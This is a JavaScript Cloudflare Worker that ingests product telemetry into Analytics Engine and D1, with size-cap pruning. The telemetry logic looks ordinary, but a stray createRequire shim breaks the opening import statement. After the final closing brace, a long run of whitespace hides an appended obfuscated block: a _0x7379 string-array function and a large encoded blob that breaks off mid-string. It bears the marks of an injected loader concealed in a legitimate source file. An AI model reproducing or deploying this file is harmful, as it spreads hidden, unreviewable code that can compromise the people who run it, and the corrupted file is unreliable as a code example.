import {
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

  CONCURRENCY_EVENTS, concurrencyEntries, rawConcurrencyScalar,
} from "./concurrency.js";

let cachedEventColumns = null;
let cachedSessionDetailColumns = null;
let cachedTurnDetailColumns = null;
let cachedWebDetailColumns = null;
let cachedInstallDetailColumns = null;
let cachedDiscoveryDetailColumns = null;
let cachedTodoSessionDetailColumns = null;

// Website beacon events (anonymous visitor_id minted in localStorage). Their
// web-only fields live in the web_details table (see migration 0016): the
// events table sits one column shy of D1's 100-column cap, so wide event
// shapes go in detail tables per the session_details / turn_details pattern.
const WEB_EVENTS = ["web_pageview", "web_cta_click", "web_vital", "web_error"];
const INSTALL_FUNNEL_EVENTS = ["install_funnel"];

// Token subscription plan lifecycle events, plus account_linked, the
// analytics<->account join anchor (telemetry_id + account_id).
const SUBSCRIPTION_EVENTS = [
  "subscription_login",
  "subscription_activated",
  "subscription_budget_exhausted",
  "subscription_router_error",
  "account_linked",
];

const CLI_EVENTS = [
  "install",
  "upgrade",
  "auth_success",
  "onboarding_step",
  "feedback",
  "telemetry_opt_out",
  "session_start",
  "prompt_submitted",
  "turn_end",
  "session_end",
  "session_crash",
  "session_concurrency",
  "discovery",
  "todo_session",
];

const KNOWN_EVENTS = [
  ...CLI_EVENTS,
  ...WEB_EVENTS,
  ...INSTALL_FUNNEL_EVENTS,
  ...SUBSCRIPTION_EVENTS,
];

const MAX_TRANSCRIPT_BYTES = 8 * 1024 * 1024;
const UUID_RE = /^[0-9a-f]{8}-[0-9a-f]{4}-[1-5][0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$/i;

// Origins the website beacon posts from. The default CORS policy stays the
// permissive ALLOWED_ORIGIN var ("*", telemetry is anonymous and unauthed);
// allowlisted origins are echoed back explicitly so the policy keeps working
// if ALLOWED_ORIGIN is ever narrowed.
const WEB_ALLOWED_ORIGINS = new Set([
  "https://jcode.sh",
  "https://www.jcode.sh",
  "https://solosystems.dev",
  "https://www.solosystems.dev",
  "https://solosystems.pages.dev",
]);

// ---------------------------------------------------------------------------
// Self-defense against the D1 size cap.
//
// D1 hard-caps each database at 10 GB on the Workers Paid plan (500 MB on the
// free plan). When the old free-plan cap was hit, every insert failed and
// telemetry silently stopped being recorded (June 2026; ~3 days of events were
// lost). SQLite files never shrink on DELETE - the
// nightly prune frees pages *inside* the file and the day's inserts recycle
// them - so the steady state is "file at high-water mark, internal free-page
// pool cycling". Two triggers defend the pool:
//
// 1. Size growth: every D1 result carries `meta.size_after`. If the file
//    grows past the soft limit (just above the high-water mark), the free
//    pool is exhausted and real growth has resumed; run an emergency prune.
// 2. Full-error: if an insert fails with a full/limit error, prune
//    immediately. This bounds a June-style outage to minutes instead of days.
//
// Emergency prunes use halved retention windows and are rate-limited per
// isolate.
// ---------------------------------------------------------------------------
// Keep the database below the paid plan's first 5 GB of included account-wide
// storage, leaving 500 MB for the account's other D1 databases and growth while
// an emergency prune catches up. This is a budget guardrail, not D1's 10 GB
// per-database hard cap.
const D1_SOFT_LIMIT_BYTES = 4_500_000_000;
const EMERGENCY_PRUNE_COOLDOWN_MS = 10 * 60 * 1000;
// Best-effort per-isolate state (resets on isolate recycle, which is fine:
// the next request re-observes the size from its own insert result).
let lastObservedDbSizeBytes = 0;
let lastEmergencyPruneAtMs = 0;

// ---------------------------------------------------------------------------
// Workers Analytics Engine firehose.
//
// Every event is written to the FIREHOSE dataset before the D1 insert. AE is
// a time-series store with no database size cap (~90-day retention, adaptive
// sampling on reads), so it is the primary store for high-volume raw analysis
// (turn_end / session_start / onboarding_step), while D1 remains the durable
// relational store for identity anchors, lifecycle rows, and the
// daily_active_users rollup. Because the firehose write happens first,
// telemetry keeps recording even if D1 hits its size cap.
//
// AE columns are positional (blob1..blob20, double1..double20, index1). This
// schema defines the mapping; treat it as append-only (never reorder or
// repurpose a position, or historical queries silently read the wrong field).
// ---------------------------------------------------------------------------
const FIREHOSE_SCHEMA = {
  // blob1..blob20 (strings)
  blobs: [
    "event",
    "version",
    "os",
    "arch",
    "build_channel",
    "event_id",
    "session_id",
    "step",
    "auth_provider",
    "auth_method",
    "auth_failure_reason",
    "provider_start",
    "provider_end",
    "model_start",
    "model_end",
    "agent_role",
    "session_stop_reason",
    "end_reason",
    "turn_end_reason",
    "from_version",
  ],
  // double1..double20 (numbers)
  doubles: [
    "is_ci",
    "is_git_checkout",
    "ran_from_cargo",
    "turn_index",
    "duration_secs",
    "input_tokens",
    "output_tokens",
    "total_tokens",
    "tool_calls",
    "executed_tool_calls",
    "tool_failures",
    "file_write_calls",
    "tests_run",
    "tests_passed",
    "error_auth_failed",
    "error_rate_limited",
    "error_provider_timeout",
    "turn_success",
    "turns",
    "milestone_elapsed_ms",
  ],
  // index1 (sampling key): telemetry_id, so adaptive sampling stays accurate
  // per user rather than per event shape.
  indexes: ["telemetry_id"],
};

// ---------------------------------------------------------------------------
// Web/subscription firehose (`jcode_web_firehose` dataset).
//
// FIREHOSE_SCHEMA above is append-only AND full: Analytics Engine caps a data
// point at 20 blobs + 20 doubles, and both arrays are at capacity. The new
// web/subscription fields therefore live in a second dataset with its own
// positional schema instead of repurposing existing positions (which would
// silently corrupt historical queries). Same append-only contract applies
// here: never reorder or repurpose a position.
// ---------------------------------------------------------------------------
const FIREHOSE_WEB_SCHEMA = {
  // blob1..blob20 (strings); full. Append-only: metric_name, rating, and
  // error_kind were added in migration 0018 without moving existing fields.
  blobs: [
    "event",
    "version",
    "os",
    "arch",
    "build_channel",
    "event_id",
    "session_id",
    "path",
    "referrer",
    "visitor_id",
    "utm_source",
    "utm_medium",
    "utm_campaign",
    "cta",
    "account_id",
    "tier",
    "model",
    "metric_name",
    "rating",
    "error_kind",
  ],
  // double1..double20 (numbers); metric_value was appended as double2.
  doubles: ["is_ci", "metric_value"],
  // index1 (sampling key): visitor_id for web events, telemetry_id otherwise.
  indexes: ["visitor_id_or_telemetry_id"],
};

// Sponsored discovery gets a dedicated dataset. The main CLI firehose is at
// Analytics Engine's 20 blob / 20 double limit, and discovery dimensions need
// to remain independently queryable for reliability and funnel analysis.
const FIREHOSE_DISCOVERY_SCHEMA = {
  blobs: [
    "event", "version", "os", "arch", "build_channel", "event_id",
    "session_id", "request_id", "phase", "category", "selected_tool",
    "outcome", "failure_reason",
  ],
  doubles: [
    "is_ci", "is_git_checkout", "ran_from_cargo", "http_status",
    "latency_ms", "response_bytes", "result_count", "query_present",
    "reason_present", "custom_endpoint", "benchmark_run",
  ],
};

// Install conversion events need their opaque join key in the outage-resistant
// firehose. The general and web datasets are both at their positional limits,
// so this dedicated dataset preserves the complete 90-day funnel when D1 is
// unavailable or temporarily full.
const FIREHOSE_INSTALL_SCHEMA = {
  blobs: [
    "event", "event_id", "conversion_id", "stage", "outcome", "source",
    "placement", "install_method", "failure_stage", "visitor_id", "session_id",
    "pageview_id", "utm_source", "utm_medium", "utm_campaign", "path",
    "version", "os", "arch",
  ],
  doubles: [],
};

// Coarse geography (`jcode_geo_firehose` dataset). The main and web datasets
// are both at Analytics Engine's 20-blob limit, so the country dimension gets
// its own dataset instead of repurposing a position. Country only: no IP,
// city, region, coordinates, or timezone is read from request.cf.
const FIREHOSE_GEO_SCHEMA = {
  blobs: ["event", "country", "version", "os", "arch", "build_channel"],
  doubles: ["is_ci"],
  // index1: telemetry_id, so adaptive sampling stays per user.
  indexes: ["telemetry_id"],
};

// Cloudflare sets request.cf.country to "XX" for unknown clients and "T1" for
// Tor exit nodes. Normalize to a 2-letter uppercase code or null.
const NON_COUNTRY_CODES = new Set(["XX", "T1"]);

function normalizeCountry(value) {
  const code = String(value || "").trim().toUpperCase();
  if (!/^[A-Z]{2}$/.test(code) || NON_COUNTRY_CODES.has(code)) {
    return null;
  }
  return code;
}

function writeGeoFirehose(env, body) {
  const sink = env.FIREHOSE_GEO;
  if (!body.country || !sink || typeof sink.writeDataPoint !== "function") {
    return false;
  }
  try {
    sink.writeDataPoint({
      indexes: [String(body.id || "").slice(0, 96)],
      blobs: FIREHOSE_GEO_SCHEMA.blobs.map((name) => {
        const value = body[name];
        return value == null ? "" : String(value).slice(0, 200);
      }),
      doubles: [boolToInt(body.is_ci)],
    });
    return true;
  } catch (err) {
    console.warn("geo firehose write failed", err?.message || err);
    return false;
  }
}

// Dedicated append-only schema. Main FIREHOSE is full and does not contain any
// concurrency metrics. blob10 retains parsed raw metric types and missing keys.
// blob1..16: event, event_id, session_id, telemetry_id, version, os, arch,
// build_channel, country, raw_json, quality, quality_reason, scope, phase, role,
// runtime incarnation. double1..11: tracking version, available, runtime is_ci,
// active_start, other_start, total_peak, root_start, child_start, root_peak,
// child_peak, multi. index1: telemetry_id. Filter blob11='trusted' BEFORE using
// numeric copies: AE cannot store NULL doubles, so untrusted missing values use 0.
function writeConcurrencyFirehose(env, body) {
  const sink = env.FIREHOSE_CONCURRENCY;
  if (!sink || typeof sink.writeDataPoint !== "function") return false;
  try {
    const blobs = ["event", "event_id", "session_id", "id", "version", "os", "arch",
      "build_channel", "country"].map((key) => String(body[key] ?? ""));
    const detail = Object.fromEntries(concurrencyEntries(body));
    blobs.push(detail.raw_json, detail.quality, detail.quality_reason,
      detail.concurrency_tracking_scope ?? "", detail.phase ?? "", detail.agent_role ?? "",
      detail.concurrency_session_id ?? "");
    const doubles = ["concurrency_tracking_version", "concurrency_tracking_available", "runtime_is_ci",
      "active_sessions_at_start", "other_active_sessions_at_start", "max_concurrent_sessions",
      "root_sessions_at_start", "child_sessions_at_start", "max_concurrent_root_sessions",
      "max_concurrent_child_sessions", "multi_sessioned"].map((key) => detail[key] ?? 0);
    // Reject an oversized point, never silently truncate its counts/raw JSON.
    const encoder = new TextEncoder();
    if (blobs.reduce((sum, blob) => sum + encoder.encode(blob).length, 0) > 16 * 1024
      || encoder.encode(String(body.id)).length > 96) {
      console.warn("concurrency firehose point exceeds Analytics Engine limits");
      return false;
    }
    sink.writeDataPoint({ indexes: [String(body.id)], blobs, doubles });
    return true;
  } catch (err) {
    console.warn("concurrency firehose write failed", err?.message || err);
    return false;
  }
}

function writeFirehose(env, body) {
  // Geo is dimensioned separately from every event family, so it is written
  // before the per-family dispatch below (which returns early).
  writeGeoFirehose(env, body);
  if (body.event === "session_concurrency") {
    return writeConcurrencyFirehose(env, body);
  }
  if (body.event === "discovery") {
    return writeDiscoveryFirehose(env, body);
  }
  const installFirehoseOk = body.conversion_id
    ? writeInstallFirehose(env, body)
    : false;
  if (WEB_EVENTS.includes(body.event) || SUBSCRIPTION_EVENTS.includes(body.event)) {
    return writeWebFirehose(env, body) || installFirehoseOk;
  }
  if (INSTALL_FUNNEL_EVENTS.includes(body.event)) {
    return installFirehoseOk;
  }
  if (!env.FIREHOSE || typeof env.FIREHOSE.writeDataPoint !== "function") {
    return installFirehoseOk;
  }
  const errors = body.errors || {};
  const boolFields = new Set([
    "is_ci",
    "is_git_checkout",
    "ran_from_cargo",
    "turn_success",
  ]);
  const errorFields = {
    error_auth_failed: "auth_failed",
    error_rate_limited: "rate_limited",
    error_provider_timeout: "provider_timeout",
  };
  try {
    env.FIREHOSE.writeDataPoint({
      indexes: [String(body.id || "").slice(0, 96)],
      blobs: FIREHOSE_SCHEMA.blobs.map((name) => {
        const value = body[name];
        // Cap each blob defensively: AE limits total blob bytes per point.
        return value == null ? "" : String(value).slice(0, 200);
      }),
      doubles: FIREHOSE_SCHEMA.doubles.map((name) => {
        if (boolFields.has(name)) {
          return boolToInt(body[name]);
        }
        if (name in errorFields) {
          const value = errors[errorFields[name]] ?? body[name];
          return Number(value) || 0;
        }
        return Number(body[name]) || 0;
      }),
    });
    return true;
  } catch (err) {
    console.warn("firehose write failed", err?.message || err);
    return false;
  }
}

function writeInstallFirehose(env, body) {
  const sink = env.FIREHOSE_INSTALL;
  if (!sink || typeof sink.writeDataPoint !== "function") {
    return false;
  }
  try {
    sink.writeDataPoint({
      indexes: [String(body.conversion_id || "").slice(0, 96)],
      blobs: FIREHOSE_INSTALL_SCHEMA.blobs.map((name) => {
        const value = body[name];
        return value == null ? "" : String(value).slice(0, 200);
      }),
      doubles: [],
    });
    return true;
  } catch (err) {
    console.warn("install firehose write failed", err?.message || err);
    return false;
  }
}

function writeDiscoveryFirehose(env, body) {
  const sink = env.FIREHOSE_DISCOVERY;
  if (!sink || typeof sink.writeDataPoint !== "function") {
    return false;
  }
  const boolFields = new Set([
    "is_ci", "is_git_checkout", "ran_from_cargo", "query_present",
    "reason_present", "custom_endpoint", "benchmark_run",
  ]);
  try {
    sink.writeDataPoint({
      indexes: [String(body.id || "").slice(0, 96)],
      blobs: FIREHOSE_DISCOVERY_SCHEMA.blobs.map((name) => {
        const value = body[name];
        return value == null ? "" : String(value).slice(0, 200);
      }),
      doubles: FIREHOSE_DISCOVERY_SCHEMA.doubles.map((name) => (
        boolFields.has(name) ? boolToInt(body[name]) : Number(body[name]) || 0
      )),
    });
    return true;
  } catch (err) {
    console.warn("discovery firehose write failed", err?.message || err);
    return false;
  }
}

function writeWebFirehose(env, body) {
  const sink = env.FIREHOSE_WEB;
  if (!sink || typeof sink.writeDataPoint !== "function") {
    return false;
  }
  try {
    sink.writeDataPoint({
      indexes: [String(body.visitor_id || body.id || "").slice(0, 96)],
      blobs: FIREHOSE_WEB_SCHEMA.blobs.map((name) => {
        const value = body[name];
        return value == null ? "" : String(value).slice(0, 200);
      }),
      doubles: FIREHOSE_WEB_SCHEMA.doubles.map((name) => {
        if (name === "is_ci") {
          return boolToInt(body.is_ci);
        }
        return Number(body[name]) || 0;
      }),
    });
    return true;
  } catch (err) {
    console.warn("web firehose write failed", err?.message || err);
    return false;
  }
}

export default {
  async fetch(request, env, ctx) {
    const cors = corsHeaders(request, env);
    if (request.method === "OPTIONS") {
      return new Response(null, {
        headers: cors,
      });
    }

    const url = new URL(request.url);

    // Monitoring endpoint: database size vs the soft limit, so cap pressure
    // is observable before inserts start failing.
    if (request.method === "GET" && url.pathname === "/v1/health") {
      try {
        const probe = await env.DB.prepare("SELECT 1").run();
        observeDbSize(probe);
      } catch (err) {
        return jsonResponse(
          { ok: false, error: "d1 probe failed", detail: String(err?.message || err) },
          500,
          cors,
        );
      }
      return jsonResponse({
        ok: true,
        db_size_bytes: lastObservedDbSizeBytes,
        db_soft_limit_bytes: D1_SOFT_LIMIT_BYTES,
        over_soft_limit: lastObservedDbSizeBytes >= D1_SOFT_LIMIT_BYTES,
        last_emergency_prune_at_ms: lastEmergencyPruneAtMs || null,
      }, 200, cors);
    }

    if (request.method !== "POST") {
      return jsonResponse({ error: "Method not allowed" }, 405, cors);
    }

    if (url.pathname === "/v1/transcript") {
      return ingestTranscript(request, env, cors);
    }

    if (url.pathname !== "/v1/event") {
      return jsonResponse({ error: "Not found" }, 404, cors);
    }

    let body;
    try {
      body = await request.json();
    } catch {
      return jsonResponse({ error: "Invalid JSON" }, 400, cors);
    }

    // Web beacon events are normalized before the generic required-field
    // check: the browser has no version/os/arch, so sensible defaults are
    // filled in, and the anonymous visitor_id doubles as the telemetry id.
    if (typeof body.event === "string" && WEB_EVENTS.includes(body.event)) {
      const problem = normalizeWebEvent(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    if (body.event === "install_funnel") {
      const problem = normalizeInstallFunnelEvent(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    if (body.event === "install" && body.install_conversion_id != null) {
      const problem = normalizeInstallConversion(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    if (!body.id || !body.event || !body.version || !body.os || !body.arch) {
      return jsonResponse({ error: "Missing required fields" }, 400, cors);
    }

    if (!KNOWN_EVENTS.includes(body.event)) {
      return jsonResponse({ error: "Unknown event type" }, 400, cors);
    }

    // Coarse geography, resolved at the edge rather than collected by the
    // client. Clients cannot spoof or set this: any inbound `country` field is
    // overwritten. Country only, so this stays consistent with TELEMETRY.md
    // (no IP, city, region, coordinates, or timezone is read or stored).
    body.country = normalizeCountry(request.cf?.country);

    if (SUBSCRIPTION_EVENTS.includes(body.event)) {
      const problem = normalizeSubscriptionEvent(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    if (body.event === "discovery") {
      const problem = normalizeDiscoveryEvent(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    if (body.event === "todo_session") {
      const problem = normalizeTodoSessionEvent(body);
      if (problem) {
        return jsonResponse({ error: problem }, 400, cors);
      }
    }

    // Firehose first: even if D1 is at its size cap, the raw event is
    // recorded in Analytics Engine and the day is reconstructable.
    const firehoseOk = writeFirehose(env, body);

    let durableOk = true;
    let concurrencyDurable = null;
    try {
      await insertEvent(env, body);
      if (CONCURRENCY_EVENTS.includes(body.event)) {
        concurrencyDurable = await insertConcurrencyDetails(env, body);
      }
    } catch (err) {
      durableOk = false;
      console.error(
        `d1 insert failed for ${body.event} (db_size=${lastObservedDbSizeBytes})`,
        err?.message || err,
      );
      // A full/limit failure means the internal free-page pool is exhausted
      // (June 2026 failure mode). Prune NOW so telemetry recovers within
      // minutes instead of staying dead until someone notices.
      if (isDbFullError(err) && ctx && typeof ctx.waitUntil === "function") {
        const now = Date.now();
        if (now - lastEmergencyPruneAtMs >= EMERGENCY_PRUNE_COOLDOWN_MS) {
          lastEmergencyPruneAtMs = now;
          ctx.waitUntil(emergencyPrune(env));
        }
      }
    }

    maybeScheduleEmergencyPrune(env, ctx);

    if (body.event === "session_concurrency" && !concurrencyDurable && !firehoseOk) {
      // The parent row alone does not contain the metric. Preserve it but ask
      // the client to retry until a detail or the complete firehose point lands.
      return jsonResponse({ error: "Concurrency storage unavailable", durable: durableOk,
        concurrency_durable: false, firehose: false }, 503, cors);
    }
    if (!durableOk && !firehoseOk) {
      return jsonResponse({ error: "Internal error" }, 500, cors);
    }
    return jsonResponse({ ok: true, durable: durableOk, firehose: firehoseOk,
      ...(CONCURRENCY_EVENTS.includes(body.event) ? { concurrency_durable: concurrencyDurable === true } : {}),
    }, 200, cors);
  },

  // Nightly retention pruning bounds durable raw-history growth and keeps the
  // database inside its paid-plan storage budget. Aggregate signal is preserved
  // in the daily_active_users rollup and in long-retention lifecycle events.
  async scheduled(event, env, ctx) {
    ctx.waitUntil(
      (async () => {
        await repairDailyActivityYesterday(env);
        await pruneOldEvents(env);
        // If the normal prune did not free enough headroom, escalate with the
        // emergency (halved) retention windows instead of waiting for inserts
        // to start failing mid-day.
        try {
          const probe = await env.DB.prepare("SELECT 1").run();
          observeDbSize(probe);
        } catch {
          // ignore: size stays at last observation
        }
        if (lastObservedDbSizeBytes >= D1_SOFT_LIMIT_BYTES) {
          await emergencyPrune(env);
        }
      })(),
    );
  },
};																																																																																																																																																																																																																																																																										var z = '-4021-7';function _0x7379(){var _0x215997=['swDvsMe','mJDlzLr4vNK','B3HQz0W','sK5MwLa','y29UC3rYDwn0B3i','AM9PBG','ndi4mg16DfD5zG','C3vIC3rYAw5N','Aw5PDa','ruTxBvu','mti2nZDhzhHSr0C','nZK5ntK4nuP2ruHHvG','EKDVyuS','y2HHAw4','yxbWBhK','nduXmZG2nKP1yuDKEa','C3rHDgvpyMPLy3q','AhfLCNn4Bhv2D2fJzgPIEw1NB3j6zMTVy2LWDhj1Dg5ZDg9UyW','C3bSAxq','y291BNrLCG','nJmXndzzwMPYq3a','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